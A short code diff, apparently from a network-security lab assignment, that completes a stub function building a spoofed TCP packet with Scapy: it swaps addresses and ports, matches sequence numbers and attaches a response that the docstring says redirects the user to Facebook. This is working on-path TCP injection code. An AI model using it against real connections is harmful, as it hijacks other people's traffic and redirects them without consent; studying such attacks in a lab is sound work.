@@ -18,7 +18,11 @@ def get_tcp_injection_packet(packet):
     IP+TCP packet that will redirect the user to Facebook by sending them the
     `RESPONSE` from above.
     """
-    raise NotImplementedError()
+    if (True):
+    	ip = packet.getlayer(S.IP)
+    	tcp = packet.getlayer(S.TCP)
+    	resp = S.IP(dst = ip.src,src = ip.dst)/S.TCP(dport = tcp.sport,sport = tcp.dport,flags = "FA", seq = tcp.ack,ack=tcp.seq+len(tcp.payload))/S.Raw(load = RESPONSE)
+    	return resp
 
 
 def injection_handler(packet):
